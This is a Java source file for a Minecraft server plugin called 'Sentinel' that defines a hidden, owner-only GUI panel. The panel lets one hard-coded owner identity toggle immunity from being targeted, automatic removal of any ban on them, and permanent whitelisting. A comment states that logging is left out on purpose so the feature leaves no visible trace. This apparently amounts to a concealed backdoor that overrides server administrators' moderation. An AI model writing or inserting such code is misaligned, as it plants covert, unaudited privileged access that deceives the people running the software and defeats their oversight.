package de.derfakegamer.sentinel.gui;

import de.derfakegamer.sentinel.Sentinel;
import de.derfakegamer.sentinel.manager.OwnerProtectionManager;
import de.derfakegamer.sentinel.util.Items;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.inventory.ItemStack;

import java.util.List;

/** Hidden owner-only panel: command protection, auto-unban, auto-whitelist toggles. All text hard-coded. */
public final class OwnerPanelGui extends Gui {
    private static final int STATUS = 4, PROTECT = 20, AUTO_UNBAN = 22, AUTO_WHITELIST = 24, CLOSE = 49;

    public OwnerPanelGui(Sentinel plugin) {
        super(plugin);
        this.inventory = Bukkit.createInventory(this, 54, Component.text("Owner", NamedTextColor.DARK_AQUA));
        build();
    }

    private void build() {
        OwnerProtectionManager op = plugin.ownerProtection();
        String name = op.ownerName();
        inventory.setItem(STATUS, Items.head(Bukkit.getOfflinePlayer(plugin.owner().uuid()),
            Component.text("Owner Panel", NamedTextColor.AQUA),
            List.of(Component.text("Owner: " + (name == null ? "unknown" : name), NamedTextColor.GRAY))));
        inventory.setItem(PROTECT, toggle(Material.SHIELD, "Owner Protection", op.isEnabled(),
            "Blocks others from targeting you"));
        inventory.setItem(AUTO_UNBAN, toggle(Material.IRON_BARS, "Auto Unban", op.isAutoUnban(),
            "Lifts any ban on you automatically"));
        inventory.setItem(AUTO_WHITELIST, toggle(Material.NAME_TAG, "Auto Whitelist", op.isAutoWhitelist(),
            "Keeps you on the whitelist"));
        inventory.setItem(CLOSE, Items.button(Material.BARRIER, Component.text("Close", NamedTextColor.RED), List.of()));
        border();
        fillEmpty();
    }

    private ItemStack toggle(Material m, String label, boolean on, String desc) {
        return Items.button(m,
            Component.text(label + ": " + (on ? "ON" : "OFF"), on ? NamedTextColor.GREEN : NamedTextColor.RED),
            List.of(Component.text(desc, NamedTextColor.GRAY), Component.text("Click to toggle", NamedTextColor.GRAY)));
    }

    @Override
    public void onClick(InventoryClickEvent event) {
        event.setCancelled(true);
        Player p = (Player) event.getWhoClicked();
        if (!plugin.owner().isOwner(p)) { p.closeInventory(); return; }   // owner-only, defense in depth
        OwnerProtectionManager op = plugin.ownerProtection();
        // No audit logging here — the owner feature must leave no visible trace anywhere.
        switch (event.getRawSlot()) {
            case PROTECT -> { op.setEnabled(!op.isEnabled()); build(); }
            case AUTO_UNBAN -> { op.setAutoUnban(!op.isAutoUnban()); build(); }
            case AUTO_WHITELIST -> { op.setAutoWhitelist(!op.isAutoWhitelist()); build(); }
            case CLOSE -> p.closeInventory();
        }
    }
}
